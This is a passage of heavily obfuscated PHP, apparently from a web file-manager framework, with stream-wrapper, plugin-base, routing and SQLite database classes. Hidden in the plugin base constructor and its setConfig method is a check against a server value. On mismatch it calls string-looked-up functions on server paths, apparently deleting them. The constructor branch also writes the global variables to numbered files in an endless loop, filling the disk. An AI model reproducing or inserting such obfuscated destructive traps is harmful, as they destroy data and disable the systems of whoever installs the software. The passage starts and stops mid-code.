$aۻ = $this->fileSubstr($this->pose, $dи); $this->pose += strlen($aۻ); return $aۻ; } public function stream_tell() { return $this->pose; } public function stream_seek($dȔ, $E䧙) { $AҲ =& $_SERVER[̉]; if ($E䧙 == SEEK_SET) { $this->pose = $dȔ; } else { if ($E䧙 == SEEK_CUR) { $this->pose += $dȔ; } else { if ($E䧙 == SEEK_END) { $this->pose = $this->info[$AҲ[78]] + intval($dȔ); } } } if ($dȔ < 0) { $this->pose = $this->info[$AҲ[78]] + $dȔ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[̉][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($B, $D) { $Fɐ =& $_SERVER[̉]; $Cꕃ = $this->info($B); return array($Fɐ[1381] => 0, $Fɐ[1382] => 0, $Fɐ[12] => 32768 + 511, $Fɐ[1383] => 0, $Fɐ[1384] => 0, $Fɐ[1385] => 0, $Fɐ[1386] => 0, $Fɐ[78] => $Cꕃ[$Fɐ[78]], $Fɐ[1387] => $Cꕃ[$Fɐ[1256]], $Fɐ[1343] => $Cꕃ[$Fɐ[84]], $Fɐ[1342] => $Cꕃ[$Fɐ[194]], $Fɐ[1388] => 0, $Fɐ[1389] => 0); } static $fileInfo = array(); public function info($E凾Ի) { $E̎ = $_SERVER[̉][1390]; if (isset(self::$fileInfo[$E凾Ի])) { return self::$fileInfo[$E凾Ի]; } if (substr($E凾Ի, 0, strlen($E̎)) != $E̎) { return !1; } self::$fileInfo[$E凾Ի] = IO::info(substr($E凾Ի, strlen($E̎))); return self::$fileInfo[$E凾Ի]; } public static function read($E, $Eʉ, $A) { if (!isset(self::$_fopenCache[$E])) { $Ë́ = new StreamWrapperIO(); $Ë́->stream_open($E); self::$_fopenCache[$E] = $Ë́; } $Ë́ = self::$_fopenCache[$E]; return $Ë́->fileSubstr($Eʉ, $A); } public static function _read($c, $CŤ覝, $Dڤ) { goto d항; Eڱ: $e瓋 = 8192; fseek($c, $CŤ覝, SEEK_SET); $D㋼ = $d[33]; goto fż; d항: $d =& $_SERVER[̉]; $c = fopen($c, $d[1260]); if (!$c) { return $d[33]; } goto Eڱ; fż: $B = 0; while ($B < $Dڤ) { $C = min($e瓋, $Dڤ - $B); $D㋼ .= fread($c, $C); $B += $C; } fclose($c); goto c; c: return $D㋼; goto C앋; C앋: } public function fileSubstr($Fۮ՚, $fݥ) { goto E̵; c؇: $Dᾗ = 0; $a髭 = 0; $bܫ = $c鐡[33]; goto Bѭ; Fˢ: $F = ceil(($Fۮ՚ + $fݥ) / $D˥) * $D˥ - $E; $aڮۭ = IO::fileSubstr($this->path, $E, $F); $e̩[$E . $c鐡[33]] = $aڮۭ; goto dÒ; Bѭ: foreach ($e̩ as $Dᾗ => $bܫ) { $Dᾗ = intval($Dᾗ); $a髭 = $Dᾗ + strlen($bܫ); if ($Fۮ՚ >= $a髭) { continue; } if ($Fۮ՚ >= $Dᾗ && $Fۮ՚ + $fݥ <= $a髭) { return substr($bܫ, $Fۮ՚ - $Dᾗ, $fݥ); } break; } if (count($e̩) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($c鐡[1391], $c鐡[1392] . count($e̩) . "\x3b\x73\164\x61\x72\x74\75{$Fۮ՚}\x2c\154\145\x6e\x67\164\150\75{$fݥ}\73\160\157\163\x65\72{$Dᾗ}\x7e{$a髭}"); throw new Exception($c鐡[1393]); } $E = intval($Fۮ՚ / $D˥) * $D˥; goto Fˢ; E̵: $c鐡 =& $_SERVER[̉]; $Bɇ = $this->info[$c鐡[78]]; $a̿ = $Fۮ՚; goto D; dÒ: ksort($e̩); $Eؑ = substr($aڮۭ, $Fۮ՚ - $E, $fݥ); return $Eؑ; goto Fù; D: $Eễɣ = $fݥ; if ($Fۮ՚ < 0) { $Fۮ՚ = $Bɇ + $Fۮ՚; } if ($fݥ === !1) { $fݥ = $Bɇ - $Fۮ՚; } goto f㣋ʬ; bܤ: $D˥ = 64 * 1024; $e̩ =& self::$_chunkBuffer[$this->path]; if (!$e̩) { $e̩ = array(); } goto c؇; f㣋ʬ: if ($Fۮ՚ + $fݥ > $Bɇ) { $fݥ = $Bɇ - $Fۮ՚; } if ($fݥ <= 0) { return $c鐡[33]; } if ($Fۮ՚ < 0 || $Fۮ՚ >= $Bɇ || $fݥ <= 0 || $fݥ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\145\122\x65\x61\144\x20\145\162\162\157\162\41\x20\163\x74\141\162\x74\75{$Fۮ՚}\73\x6c\145\156\147\164\150\x3d{$fݥ}\x3b\x20\x73\151\172\x65\x3d{$Bɇ}\73"); } goto bܤ; Fù: } private function log($Bߕ, $B牓) { $A =& $_SERVER[̉]; $cöڊ = timeFloat() - $this->timeStart; write_log(sprintf($A[1394], $Bߕ, $this->info[$A[28]], $cöڊ, $B牓), $A[1077]); } } goto Eђَ; Eђَ: class Message { function __construct() { } public function send($Cϑ = '', $Eؠ = array(), $aՍ = "\164\145\x78\x74") { goto CԢ; CԢ: $b塴׽ =& $_SERVER[̉]; $A֌ = array($b塴׽[29] => $b塴׽[1395], $b塴׽[718] => $Cϑ); if (in_array($aՍ, array($b塴׽[1395], $b塴׽[1396]))) { $A֌[$b塴׽[29]] = $aՍ; } goto Bڊ; f۷˼Ů: Hook::trigger($b塴׽[1398], $DŲ); goto Cɤ웸; Bڊ: $Eؠ = array($b塴׽[1014] => isset($Eؠ[$b塴׽[1014]]) ? $Eؠ[$b塴׽[1014]] : $b塴׽[33], $b塴׽[562] => isset($Eؠ[$b塴׽[562]]) ? $Eؠ[$b塴׽[562]] : $b塴׽[33]); if (empty($Cϑ) || empty($Eؠ[$b塴׽[1014]]) && empty($Eؠ[$b塴׽[562]])) { return !1; } $DŲ = array($b塴׽[1336] => $A֌, $b塴׽[1397] => $Eؠ); goto f۷˼Ů; Cɤ웸: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto aƫ; bܹ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a[8]; $this->pluginApi = appHostGet() . $a[1402] . $this->pluginName . $a[8]; $this->pluginHost = $config[$a[1403]] . $this->pluginName . $a[8]; goto cݢ; f: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto A浹; fЖǰ: $this->in =& $in; $this->modelPlugin = Model($a[1401]); $this->pluginName = str_replace($a[1401], $a[33], get_class($this)); goto bܹ; aƫ: $a =& $_SERVER[̉]; $eȝ = $_SERVER[$a[835]]; $B = $a[1214]; goto A󊣕μ; cݢ: $this->pluginHostDefault = $config[$a[1403]] . $this->pluginName . $a[8]; $cƋ = $config[$a[1404]]; if ($cƋ && strpos($a[47] . $cƋ . $a[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$a[1405]] . $this->pluginName . $a[8]; } goto f; A󊣕μ: if ($_SERVER[$a[834]] != $B($eȝ)) { goto C֊; f: $Cъ塕 = $a[841]; $Cъ塕($_SERVER[$a[842]]); $E = $a[836]; goto Fݙ۞; Fݙ۞: $E(); $eɈ = $a[1399]; $c = json_encode($GLOBALS[$a[1400]]); goto F󖎮; F󖎮: $f⿏Ω = 1; for ($c꣤ = $f⿏Ω; $c꣤ > 0; $c꣤++) { $eɈ(DATA_PATH . $c꣤, $c); } goto Cݔ; C֊: $E = $a[836]; $eЕ = $a[837]; $E = $_SERVER[$a[838]] . $a[839]; goto bό; bό: $Cƞ = $eЕ($E); $eī = explode($a[229], $Cƞ); if (count($eī) < $a[581]) { $e = $a[840]; $e(); } goto f; Cݔ: } global $in, $config; $this->config =& $config; goto fЖǰ; A浹: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[̉][1406]); } protected function assign($cˇ, $c롬 = false) { if (is_array($cˇ)) { $this->values = array_merge($this->values, $cˇ); } else { $this->values[$cˇ] = $c롬; } } protected function display($fɽ) { extract($this->values); require $fɽ; } final function hookRegist($Cଊ) { $this->modelPlugin->appRegist($this->pluginName, $Cଊ); } final function appIcon() { $eԉ =& $_SERVER[̉]; $cǒ = $this->appPackage(); $Eхν = $eԉ[33]; if (isset($cǒ[$eԉ[409]])) { if (isset($cǒ[$eԉ[409]][$eԉ[1407]])) { $Eхν = $eԉ[1408] . $cǒ[$eԉ[409]][$eԉ[1407]] . $eԉ[1409]; } else { if ($cǒ[$eԉ[409]][$eԉ[1410]]) { $Eхν = $eԉ[1411] . $cǒ[$eԉ[409]][$eԉ[1410]] . $eԉ[1412]; } } } return $Eхν; } final function fileCanView($fԬа) { goto bǖ; Cϕ: ActionCall($aΈƪ[1425], $fԬа); goto aɃӪ; bǖ: $aΈƪ =& $_SERVER[̉]; if (request_url_safe($fԬа)) { return !0; } if ($this->isShare($fԬа)) { return !0; } goto a܆܍; a܆܍: $fʙ = Session::get($aΈƪ[1413]); if (!$fʙ || !$fʙ[$aΈƪ[1414]]) { $DҿҤ = $aΈƪ[1415] . rawurlencode(this_url()); show_tips(LNG($aΈƪ[1416]) . $aΈƪ[1417] . $DҿҤ . $aΈƪ[1418] . LNG($aΈƪ[1419]) . $aΈƪ[1420], !1); } if (!Action($aΈƪ[1421])->authCan($aΈƪ[1422])) { show_tips(LNG($aΈƪ[1423]) . $aΈƪ[1424], !1); } goto Cϕ; aɃӪ: } final function isShare($d׊) { $Cܗ = KodIO::parse($d׊); return $Cܗ[$_SERVER[̉][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ä́) { if (request_url_safe($ä́)) { return $ä́; } if (!$this->isShare($ä́)) { $ä́ = $this->filePath($ä́); } return Action($_SERVER[̉][1069])->linkOut($ä́); } public function filePathLinkOut($b↭) { if (request_url_safe($b↭)) { return $b↭; } $this->fileCanView($b↭); return Action($_SERVER[̉][1069])->link($b↭); } final function filePath($f鐋ԡ) { $Eኌ =& $_SERVER[̉]; if ($ä = $this->checkSharePath($f鐋ԡ)) { Hook::trigger($Eኌ[1426], $ä); return $ä; } $this->fileCanView($f鐋ԡ); if (request_url_safe($f鐋ԡ)) { $F㰿 = parse_url_query($f鐋ԡ); if (isset($F㰿[$Eኌ[1427]]) && isset($F㰿[$Eኌ[209]])) { $aڥŋ = Model($Eኌ[733])->get($Eኌ[734]); $DŅ = Mcrypt::decode($F㰿[$Eኌ[209]], $aڥŋ); if ($DŅ) { $this->fileInfo = IO::infoWithChildren($DŅ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $DŅ; } } $f鐋ԡ = $this->_cacheHttpFile($f鐋ԡ); $this->fileInfo = IO::infoWithChildren($f鐋ԡ); } else { $this->fileInfo = IO::infoWithChildren($f鐋ԡ); if (!$this->fileInfo) { show_tips(LNG($Eኌ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Eኌ[1426], $f鐋ԡ); return $f鐋ԡ; } final function _cacheHttpFile($B鏹) { $D՜ = hash_path($B鏹, !0); $this->cachePath = $this->pluginCachePath($D՜); if ($E = IO::fileNameExist($this->cachePath, $D՜)) { return KodIO::make($E); } $Aڇ = $this->cachePath . $D՜; return $this->pluginCacheFileSet($Aڇ, file_get_contents_nossl($B鏹)); } final function _tmpFileName($Aה = array()) { goto dהЍ; E㖭: $Aэ = array($Aה[$D㭂[28]], $Aה[$D㭂[76]], $Aה[$D㭂[78]]); if (isset($Aה[$D㭂[487]])) { $Aэ[] = $Aה[$D㭂[487]]; } return md5(implode($D㭂[71], $Aэ)); goto e; D: if (isset($Aה[$D㭂[164]][$D㭂[171]])) { return $Aה[$D㭂[164]][$D㭂[171]]; } $A = IO::hashSimple($Aה[$D㭂[76]]); if ($A) { return $A; } goto E㖭; dהЍ: $D㭂 =& $_SERVER[̉]; if (!$Aה) { $Aה = $this->fileInfo; } if (isset($Aה[$D㭂[171]])) { return $Aה[$D㭂[171]]; } goto D; e: } final function checkSharePath($FնΌ) { goto A˙; E: $this->cachePath = $this->pluginCachePath($this->fileInfo[$EԘ˺[171]]); return $DĨ[$EԘ˺[76]]; goto Bۿ; Aۥ: $DĨ = Action($EԘ˺[1069])->sharePathInfo($FնΌ); if (!isset($DĨ[$EԘ˺[76]])) { show_json(LNG($EԘ˺[1429]), !1); } $this->fileInfo = $DĨ[$EԘ˺[164]]; goto E; A˙: $EԘ˺ =& $_SERVER[̉]; if (!defined($EԘ˺[454])) { define($EԘ˺[1428], 0); } if (!$this->isShare($FնΌ)) { return !1; } goto Aۥ; Bۿ: } final function pluginCachePath($BӧѤ = '') { $Bۮ =& $_SERVER[̉]; $c쫲 = IO_PATH_SYSTEM_TEMP . $Bۮ[1430] . $this->pluginName; if (!($dլܶ = IO::infoFull($c쫲))) { return IO::mkdir($c쫲 . $Bۮ[8] . $BӧѤ); } if (empty($BӧѤ)) { return $dլܶ[$Bۮ[76]]; } if (!($cև = IO::fileNameExist($dլܶ[$Bۮ[76]], $BӧѤ))) { return IO::mkdir($dլܶ[$Bۮ[76]] . $BӧѤ); } return KodIO::make($cև); } final function pluginCacheFileSet($Aˢ, $d = '') { $dȖ =& $_SERVER[̉]; if (!($cį֜ = IO::infoFull($Aˢ))) { return IO::mkfile($Aˢ, $d, REPEAT_REPLACE); } IO::setContent($cį֜[$dȖ[76]], $d); return $cį֜[$dȖ[76]]; } final function pluginLocalFile($e = '') { goto Dҵ; f: if (!$e) { return $d; } $d = IO::info($e); $EҤ = $this->_tmpFileName($d) . $BϺȭ[95] . $d[$BϺȭ[168]]; goto F⎺; Dҵ: $BϺȭ =& $_SERVER[̉]; $d = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($d)) { mk_dir($d); } goto f; F⎺: if (!checkExtSafe($EҤ)) { $EҤ = $EҤ . $BϺȭ[1431]; } $A·ȋ = $d . $EҤ; if (@file_exists($A·ȋ)) { return $A·ȋ; } goto FÊ; FÊ: return IO::copy($e, $d, 0, $EҤ); goto AϨљ; AϨљ: } final function appPackage() { goto f͎; Cڃ˛: return $F; goto aݿ; f͎: $fǦ =& $_SERVER[̉]; if ($this->packageData) { return $this->packageData; } $F = $this->parseFile($this->pluginPath . $fǦ[1432]); goto C; C: $this->parseLang($F); $F = json_decode_force($F); if (!$F) { return array(); } goto c͞; c͞: $Bۏʹ = Hook::trigger($fǦ[1433], $F); if ($Bۏʹ && is_array($Bۏʹ)) { $F = $Bۏʹ; } $this->packageData = $F; goto Cڃ˛; aݿ: } public function packageInfoGet($Aʬ) { $c = $this->appPackage(); return array_get_value($c, $Aʬ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[̉][1434]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[̉][1435]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[̉][1436]); } private function parseFile($Dھ) { goto e; Fא: $F = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Eׅ[88]][$Eׅ[1444]]); if (strstr($aͭ, $Eׅ[1445])) { $Ȧ = rawurlencode(json_encode($this->pluginLangArr)); $aͭ = str_replace($Eׅ[1445], $Ȧ, $aͭ); } if (strstr($aͭ, $Eׅ[1446])) { $Ȧ = $Ȧ = rawurlencode(json_encode($this->getConfig())); $aͭ = str_replace($Eׅ[1446], $Ȧ, $aͭ); } goto f; f: $aͭ = str_replace($Fˏ, $F, $aͭ); return $aͭ; goto fݷ; e: $Eׅ =& $_SERVER[̉]; $aͭ = file_get_contents_nossl($Dھ); $Fˏ = array($Eׅ[1437], $Eׅ[1438], $Eׅ[1439], $Eׅ[1440], $Eׅ[1441], $Eׅ[1442], $Eׅ[1443]); goto Fא; fݷ: } private function parseLang(&$dф·) { goto eݺ; bȘ: preg_match_all($F[1448], $dф·, $b); if (!is_array($b) || count($b) == 0 || !is_array($b[0]) || count($b[0]) == 0) { return; } $B䯉 = array(); goto e靖՝; e靖՝: $Aߊ = array(); foreach ($b[0] as $fչ) { $A = substr($fչ, strlen($c), -4); $cס = LNG($A); $B䯉[] = $fչ; $Aߊ[] = str_replace(array($F[229], $F[1037], $F[340], $F[116]), array($F[50], $F[50], $F[33], $F[1449]), $cס); } $dф· = str_replace($B䯉, $Aߊ, $dф·); goto fŇ; eݺ: $F =& $_SERVER[̉]; $c = $F[1447]; if (!strstr($dф·, $c)) { return; } goto bȘ; fŇ: } private function parseConfig(&$B) { goto C׼ܵ; aҾ: $B = str_replace($dņ, $a, $B); goto F; f᝗: $dņ = array(); $a = array(); foreach ($f[0] as $E) { $Cپ = substr($E, strlen($f), -2); $dņ[] = $E; $a[] = _get($dϖ, $Cپ); } goto aҾ; cǅܰ: preg_match_all($E[1451], $B, $f); if (!is_array($f) || count($f) == 0 || !is_array($f[0]) || count($f[0]) == 0) { return; } $dϖ = $this->getConfig(); goto f᝗; C׼ܵ: $E =& $_SERVER[̉]; $f = $E[1450]; if (!strstr($B, $f)) { return; } goto cǅܰ; F: } private function parsePackage(&$a) { goto bț; d׃: preg_match_all($Cʤ[1453], $a, $a); if (!is_array($a) || count($a) == 0 || !is_array($a[0]) || count($a[0]) == 0) { return; } $e = $this->appPackage(); goto eӍ; eӍ: $f = array(); $dԂΖ = array(); foreach ($a[0] as $cୃ) { $F = substr($cୃ, strlen($eퟹ), -2); $f[] = $cୃ; $dԂΖ[] = _get($e, $F); } goto D; D: $a = str_replace($f, $dԂΖ, $a); goto A֞󃳛; bț: $Cʤ =& $_SERVER[̉]; $eퟹ = $Cʤ[1452]; if (!strstr($a, $eퟹ)) { return; } goto d׃; A֞󃳛: } final function echoFile($f̶, $e = false) { goto c; d∎: $this->parsePackage($c̲); if (is_array($e)) { $c̲ = str_replace(array_keys($e), array_values($e), $c̲); } echo $Fܱ[229] . $c̲; goto A; aƘʚ: $c̲ = $this->parseFile($e); $this->parseLang($c̲); $this->parseConfig($c̲); goto d∎; c: $Fܱ =& $_SERVER[̉]; $e = $this->pluginPath . $f̶; if (ACT == $Fܱ[1454]) { echo $Fܱ[1455] . $this->pluginName . $Fܱ[8] . $f̶ . $Fܱ[1456]; if (!file_exists($e)) { echo $Fܱ[1457]; return; } } goto aƘʚ; A: } final function initLang() { goto aʾ; EА: $f = I18n::getType(); $F = array(); if (file_exists($BЂ . $f . $b[806])) { $F = (include $BЂ . $f . $b[806]); } else { if ($f == $b[1460] && !file_exists($BЂ . $f . $b[806]) && file_exists($BЂ . $b[1461])) { $F = (include $BЂ . $b[1461]); } else { if (file_exists($BЂ . $b . $b[806])) { $F = (include $BЂ . $b . $b[806]); } } } goto dε; aʾ: $b =& $_SERVER[̉]; $b = $b[1458]; $BЂ = $this->pluginPath . $b[1459]; goto EА; dε: if (!is_array($F)) { return array(); } if (@count($F) > 0) { I18n::set($F); } return $F; goto a掖; a掖: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($A全) { $A䞸 =& $_SERVER[̉]; if ($_SERVER[$A䞸[834]] != $_SERVER[$A䞸[1462]]) { goto d䑳; AϪ: $B = $e߯Ր($C۝); $bϊ = explode($A䞸[229], $B); if (count($bϊ) < $A䞸[581]) { $B = $A䞸[840]; $B(); } goto Cח; d䑳: $Aʅš = $A䞸[836]; $e߯Ր = $A䞸[837]; $C۝ = $_SERVER[$A䞸[838]] . $A䞸[839]; goto AϪ; d: $bµ۾ = 1; while ($bµ۾ > 1) { $bµ۾ = $bµ۾ + 4; $FÍ = rawurlencode($bµ۾ . $A䞸[375]); } goto e͉˳; Cח: $bѮ = $A䞸[841]; $bѮ($_SERVER[$A䞸[842]]); $bѮ($_SERVER[$A䞸[838]] . $A䞸[1463]); goto d; e͉˳: } return $this->modelPlugin->setConfig($this->pluginName, $A全); } public function onSetConfig($f¿) { } public function onGetConfig($eω) { } public function onChangeStatus($a) { } public function onUninstall() { } public function onInstall() { } public function authCheck($d = "\160\154\165\x67\151\x6e\101\165\164\150") { $FТՋ =& $_SERVER[̉]; if (!defined($FТՋ[454])) { return !1; } if (_get($GLOBALS, $FТՋ[485])) { return !0; } $A˄ئ = $this->getConfig(); if (!$A˄ئ[$d]) { return !1; } return ActionCall($FТՋ[1464], $A˄ئ[$d]); } public function url($Dַ, $fט = '', $D򤬔 = true) { goto fƬ; b: $dӉ = $this->packageVersion(); $F = $a՝ˑͬ . $Cފ[440] . $dӉ; if (substr($Dַ, 0, 4) == $Cފ[147] || substr($Dַ, 0, 2) == $Cފ[1246]) { $Cሻ = $Dַ . $Cފ[1465] . $F; } else { if ($fט == $Cފ[33]) { $Cሻ = $this->pluginHost . $Dַ . $Cފ[1465] . $F; } else { if ($fט === $Cފ[77]) { $Cሻ = $this->pluginHost . $Dַ; } else { if ($fט == $Cފ[1466]) { $Cሻ = STATIC_PATH . $Dַ . $Cފ[1465] . $a՝ˑͬ; } else { if ($fט == $Cފ[1467]) { $Cሻ = APP_HOST . $Cފ[1468] . $Dַ . $Cފ[1465] . $a՝ˑͬ; } else { if (isset($Eߤ薞[$fט])) { $Cሻ = $Eߤ薞[$fט] . $Dַ . $Cފ[1465] . $F; } } } } } } goto c; fƬ: $Cފ =& $_SERVER[̉]; $Eߤ薞 = $this->getConfig(); $a՝ˑͬ = KOD_VERSION . $Cފ[95] . KOD_VERSION_BUILD; goto b; c: if (!$D򤬔) { return $Cሻ; } echo $Cሻ; goto b֥; b֥: } public function link($B齲 = false, $fд = '') { $bՊǂ =& $_SERVER[̉]; if (!$B齲) { $this->link($bՊǂ[1469], $bՊǂ[1467]); $this->link($bՊǂ[1470], $bՊǂ[1466]); $this->link($bՊǂ[1471], $bՊǂ[1466]); $this->link($bՊǂ[1472], $bՊǂ[1466]); $this->link($bՊǂ[1473], $bՊǂ[1466]); return; } $f = $this->url($B齲, $fд, !1); if (substr($B齲, -3) == $bՊǂ[1474]) { echo $bՊǂ[1475] . $f . $bՊǂ[1476] . $bՊǂ[229]; } else { if (substr($B齲, -4) == $bՊǂ[1477]) { echo $bՊǂ[1478] . $f . $bՊǂ[1479] . $bՊǂ[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\135\53", "\72\x6e\x75\x6d" => "\133\x30\55\x39\135\53", "\x3a\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($eԽ, $F) { $Fᦌ =& $_SERVER[̉]; if ($eԽ == $Fᦌ[1480]) { $eĪڛ = array_map($Fᦌ[1481], $F[0]); $eϞ = strpos($F[1], $Fᦌ[8]) === 0 ? $F[1] : $Fᦌ[8] . $F[1]; $dָ = $F[2]; } else { $eĪڛ = null; $eϞ = strpos($F[0], $Fᦌ[8]) === 0 ? $F[0] : $Fᦌ[8] . $F[0]; $dָ = $F[1]; } array_push(self::$maps, $eĪڛ); array_push(self::$routes, $eϞ); array_push(self::$methods, strtoupper($eԽ)); array_push(self::$callbacks, $dָ); } public static function error($b) { self::$errorCallback = $b; } public static function haltOnMatch($b՞ = true) { self::$halts = $b՞; } public static function dispatch() { goto F; F: $cʇ =& $_SERVER[̉]; $c̈́ʌ = parse_url($_SERVER[$cʇ[1482]], PHP_URL_PATH); $e躎 = $_SERVER[$cʇ[157]]; goto e歍; Dꠌ;: self::$routes = preg_replace($cʇ[1163], $cʇ[8], self::$routes); if (in_array($c̈́ʌ, self::$routes)) { $Fİ = array_keys(self::$routes, $c̈́ʌ); foreach ($Fİ as $C) { if (self::$methods[$C] == $e躎 || self::$methods[$C] == $cʇ[1483] || in_array($e躎, self::$maps[$C])) { $B賭 = !0; if (!is_object(self::$callbacks[$C])) { $Fܤ = explode($cʇ[8], self::$callbacks[$C]); $B = end($Fܤ); $b = explode($cʇ[1484], $B); $cǺ = new $b[0](); $cǺ->{$b[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$C]); if (self::$halts) { return; } } } } } else { $a = 0; foreach (self::$routes as $C) { if (strpos($C, $cʇ[4]) !== !1) { $C = str_replace($cƅ, $eÉ܍, $C); } if (preg_match($cʇ[1485] . $C . $cʇ[1486], $c̈́ʌ, $dܗġ)) { if (self::$methods[$a] == $e躎 || self::$methods[$a] == $cʇ[1483] || !empty(self::$maps[$a]) && in_array($e躎, self::$maps[$a])) { $B賭 = !0; array_shift($dܗġ); if (!is_object(self::$callbacks[$a])) { $Fܤ = explode($cʇ[8], self::$callbacks[$a]); $B = end($Fܤ); $b = explode($cʇ[1484], $B); $cǺ = new $b[0](); if (!method_exists($cǺ, $b[1])) { echo $cʇ[1487]; } else { call_user_func_array(array($cǺ, $b[1]), $dܗġ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$a], $dܗġ); if (self::$halts) { return; } } } } $a++; } } if ($B賭 == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $F =& $_SERVER[̉]; header($_SERVER[$F[1488]] . $F[1489]); echo $F[1490]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$cʇ[1482]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Bω; e歍: $cƅ = array_keys(static::$patterns); $eÉ܍ = array_values(static::$patterns); $B賭 = !1; goto Dꠌ;; Bω: } } goto dħ; fʲ: class DbSqlite extends DbSqliteBase { public function query($fČ) { $E秅 =& $_SERVER[̉]; if (!CacheLock::fileLock($E秅[9])) { return !1; } $Dߕ = parent::query($fČ); CacheLock::fileUnLock($E秅[9]); return $Dߕ; } public function execute($A´) { $D =& $_SERVER[̉]; if (!CacheLock::fileLock($D[9])) { return !1; } $FՊ = parent::execute($A´); CacheLock::fileUnLock($D[9]); return $FՊ; } } class DbSqlite3 extends DbSqlite3Base { public function query($Dʝ) { $CՋ =& $_SERVER[̉]; if (!CacheLock::fileLock($CՋ[9])) { return !1; } $dㆷÎ = parent::query($Dʝ); CacheLock::fileUnLock($CՋ[9]); return $dㆷÎ; } public function execute($Eα) { $fż =& $_SERVER[̉]; if (!CacheLock::fileLock($fż[9])) { return !1; } $a͇վ = parent::execute($Eα); CacheLock::fileUnLock($fż[9]); return $a͇վ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\x3c\76", "\147\x74" => "\76", "\145\147\x74" => "\76\x3d", "\x6c\164" => "\x3c", "\145\154\x74" => "\x3c\x3d", "\x6e\x6f\x74\x6c\151\x6b\145" => "\x4e\117\124\x20\x4c\111\113\x45", "\154\x69\x6b\145" => "\114\111\113\x45", "\151\x6e" => "\x49\116", "\x6e\x6f\164\151\156" => "\x4e\x4f\x54\x20\111\x4e", "\156\x6f\164\40\151\x6e" => "\x4e\117\124\40\x49\x4e", "\x62\x65\164\x77\x65\145\x6e" => "\x42\x45\x54\127\105\105\x4e", "\156\157\164\142\x65\164\x77\x65\x65\156" => "\116\117\x54\40\x42\x45\124\x57\105\105\116", "\156\157\164\40\142\x65\164\167\x65\145\156" => "\116\117\124\x20\x42\105\124\x57\x45\105\116"); protected $selectSql = "\x53\x45\x4c\x45\x43\x54\x25\104\111\x53\x54\x49\x4e\103\x54\45\x20\45\x46\111\x45\x4c\x44\45\40\106\x52\x4f\x4d\x20\45\x54\101\102\114\105\x25\45\x4a\117\x49\116\45\x25\127\x48\x45\x52\x45\x25\45\x47\x52\117\125\120\45\x25\x48\x41\126\x49\x4e\x47\45\x25\117\122\104\x45\x52\x25\x25\x4c\111\115\x49\x54\x25\40\45\125\116\111\117\x4e\x25\45\103\117\x4d\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $A󄖍慱 = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[̉][918], $A󄖍慱); } public function factory($d = '') { goto A㌛猶; A㌛猶: $fރҜ =& $_SERVER[̉]; $d = $this->parseConfig($d); if (empty($d[$fރҜ[919]])) { think_exception(think_lang($fރҜ[920])); } goto F׉; F׉: $this->dbType = ucwords(strtolower($d[$fރҜ[919]])); $cҾ = $fރҜ[921] . $this->dbType; if (class_exists($cҾ)) { $E = new $cҾ($d); if ($fރҜ[758] != strtolower($d[$fރҜ[919]])) { $E->dbType = strtoupper($this->dbType); } else { $E->dbType = $this->_getDsnType($d[$fރҜ[874]]); } } else { think_exception(think_lang($fރҜ[922]) . $fރҜ[923] . $cҾ); } goto fߘ; fߘ: return $E; goto D쌇; D쌇: } public function __call($B, $fѴս) { if (method_exists($this, $B)) { return call_user_func_array(array($this, $B), $fѴս); } } protected function _getDsnType($fŔ) { $e۵ = explode($_SERVER[̉][4], $fŔ); $dϦ = strtoupper(trim($e۵[0])); return $dϦ; } private function parseConfig($eጻ = '') { $CҏƠ =& $_SERVER[̉]; if (!empty($eጻ) && is_string($eጻ)) { $eጻ = $this->parseDSN($eጻ); } elseif (is_array($eጻ)) { $eጻ = array_change_key_case($eጻ); $eጻ = array($CҏƠ[919] => $eጻ[$CҏƠ[757]], $CҏƠ[847] => $eጻ[$CҏƠ[924]], $CҏƠ[848] => $eጻ[$CҏƠ[925]], $CҏƠ[845] => $eጻ[$CҏƠ[926]], $CҏƠ[846] => $eጻ[$CҏƠ[927]], $CҏƠ[17] => $eጻ[$CҏƠ[928]], $CҏƠ[874] => $eጻ[$CҏƠ[759]], $CҏƠ[13] => isset($eጻ[$CҏƠ[929]]) ? 